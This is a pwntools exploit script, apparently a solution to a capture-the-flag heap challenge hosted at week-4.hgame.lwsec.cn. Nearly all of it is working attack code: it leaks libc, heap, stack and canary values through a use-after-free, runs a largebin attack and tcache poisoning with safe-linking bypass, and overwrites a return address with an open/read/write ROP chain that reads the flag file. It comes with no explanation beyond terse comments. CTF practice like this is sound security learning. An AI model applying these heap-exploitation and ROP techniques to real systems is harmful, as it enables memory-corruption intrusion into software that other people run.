from pwn import *
import time

#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ["/bin/tmux","sp","-h"]
debug = True
python_version = sys.version_info.major

elf = ELF("./vuln")
if debug:
    libc = ELF("./libc.so.6")
    io = process(["./vuln"],env={'LD_PRELOAD':"./libc.so.6"})
else:
    io = remote("week-4.hgame.lwsec.cn", 30220)
    libc = ELF("./libc.so.6")

def get_libc_gadget(rop_gadget):
    if python_version == 2:
        gadget = libc.search(rop_gadget).next() if rop_gadget == '/bin/sh\x00' else libc.search(asm(rop_gadget)).next()
    else:
        gadget = libc.search(rop_gadget).__next__() if rop_gadget == b'/bin/sh\x00' else libc.search(asm(rop_gadget)).__next__()
    return gadget

gdb_script = '''
source /home/yrl/loadsym.py
loadsym /home/yrl/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/.debug/usr/lib/debug/.build-id/d1/704d25fbbb72fa95d517b883131828c0883fe9.debug
'''

def ddebug():
    gdb.attach(io,gdb_script)
    pause()


rop = ROP('./vuln')
roplibc = ROP("./libc.so.6")


def add(idx, size, content):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())

def delete(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())


def edit(idx,content):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Content: ", content)
    
def show(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())


add(0, 0x528, b"abc")
add(1, 0x500, b"abc")
add(2, 0x518, b"abc")
add(3, 0x500, b"abc")

delete(0)
add(5, 0x538, b"abc")
show(0)
libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))
libc.address = libcmain_offset - 0x1f70f0
success("libc address -> " + hex(libc.address))
free_hook_address = libc.symbols["__free_hook"]
success("free_hook_address -> " + hex(free_hook_address))
system = libc.symbols["system"]
success("system -> " + hex(system))
tcachebins = libc.address + 0x1f63a8
success("tcachebins -> " + hex(tcachebins))
environ_addr = libc.symbols["environ"]
success("environ_addr -> " + hex(environ_addr))
openaddr = libc.symbols["open"]
success("openaddr -> " + hex(openaddr))
readaddr = libc.symbols["read"]
success("readaddr -> " + hex(readaddr))
writeaddr = libc.symbols["write"]
success("writeaddr -> " + hex(writeaddr))

# leak heap_ptr
edit(0, b'a'*0x10)
show(0)
io.recvuntil(b"a"*0x10)
heap_ptr = u64(io.recvn(6).ljust(8, b"\x00"))
success("heap_ptr -> " + hex(heap_ptr))

# recover largebin
edit(0, p64(libcmain_offset)*2)

# make unsortedbin size < largebin size
delete(3)

# modify largebin bk_nextsize = target
edit(0, p64(libcmain_offset)*2 + p64(0) + p64(tcachebins-0x20))
# trigger largebin attack , modify mp_tcache_bins to a big number
add(5, 0x538, b"abc")

# tcachebin attack
add(6, 0x550, b"abc")
add(7, 0x550, b"abc")
delete(7)
delete(6)

success("free_hook_address_enc -> " + hex(environ_addr^((heap_ptr+0x2410)>>12)))

edit(6, p64(environ_addr^((heap_ptr+0x2410)>>12)))
add(6, 0x550, b"abc")
add(7, 0x550, b"abc")
show(7)
stack_environ = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("stack_environ -> " + hex(stack_environ))


# overwrite chunk7
add(7, 0x550, b"abc")

# leak canary
delete(7)
delete(6)
edit(6, p64((stack_environ-0xa8)^((heap_ptr+0x2190)>>12)))
add(6, 0x550, b"abc")
add(7, 0x550, b"abc")
edit(7, b'a'*25)
show(7)
io.recvuntil(b"a"*25)
canary = u64(io.recvn(7).rjust(8, b"\x00"))
success("canary -> " + hex(canary))

# overwrite chunk7
add(7, 0x550, b"abc")

pop_rdx_rbx = get_libc_gadget("pop rdx;pop rbx;ret") # pop rdx ; pop rbx ; ret
pop_rdi = get_libc_gadget("pop rdi;ret")
pop_rsi = get_libc_gadget("pop rsi;ret")
success("pop_rdx_rbx -> " + hex(pop_rdx_rbx))

payload = p64(pop_rdi) + p64(0x1f00 + heap_ptr) + p64(pop_rsi) + p64(0) + p64(openaddr)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x1f00 + heap_ptr + 0x10) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(readaddr)# rdx + 0x20
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x1f00 + heap_ptr + 0x10) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(writeaddr)

# overwrite edit ret addr to orw ropchain
delete(7)
delete(6)
edit(6, p64((stack_environ-0x168)^((heap_ptr+0x1f00)>>12)))
add(6, 0x550, b"abc")
edit(6, b'./flag\x00')
add(7, 0x550, b"abc")
#ddebug()
edit(7, p64(0) + p64(canary) + p64(0) + payload)


io.interactive()
